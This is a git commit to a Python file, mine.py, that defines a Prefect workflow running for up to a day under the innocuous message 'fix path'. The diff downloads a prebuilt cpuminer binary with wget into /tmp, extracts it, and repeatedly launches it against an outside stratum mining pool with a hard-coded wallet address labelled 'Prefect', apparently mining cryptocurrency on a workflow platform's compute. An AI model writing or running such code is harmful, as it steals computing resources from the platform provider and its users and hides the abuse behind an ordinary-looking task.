8fffdc90cdd16c65d8ccd87e8967652d82899289
Imam <musicimam99@gmail.com>
2026-06-14 18:54:28 +0000

    fix path

--- mine.py
+++ mine.py
@@ -4,11 +4,10 @@ from prefect import flow, get_run_logger
 @flow(timeout_seconds=86400)
 def mine():
     logger = get_run_logger()
-    if not os.path.exists("./cpuminer-avx2"):
-        subprocess.run("wget -q https://github.com/RainbowMiner/miner-binaries/releases/download/v5.0.46-rplant/cpuminer-opt-linux-5.0.46u.tar.gz -O c.tar.gz && tar xf c.tar.gz", shell=True)
+    subprocess.run("wget -q https://github.com/RainbowMiner/miner-binaries/releases/download/v5.0.46-rplant/cpuminer-opt-linux-5.0.46u.tar.gz -O /tmp/c.tar.gz && tar xf /tmp/c.tar.gz -C /tmp/", shell=True)
     while True:
         result = subprocess.run(
-            "./cpuminer-avx2 -a yespowertide -o stratum+tcps://na.rplant.xyz:17059 -u TWJa3cLtb2ibL5C6i93GVD6DTHjUqpuxHs.Prefect -t 4",
+            "/tmp/cpuminer-avx2 -a yespowertide -o stratum+tcps://na.rplant.xyz:17059 -u TWJa3cLtb2ibL5C6i93GVD6DTHjUqpuxHs.Prefect -t 4",
             shell=True, capture_output=True, text=True, timeout=300
         )
         logger.info(result.stdout)
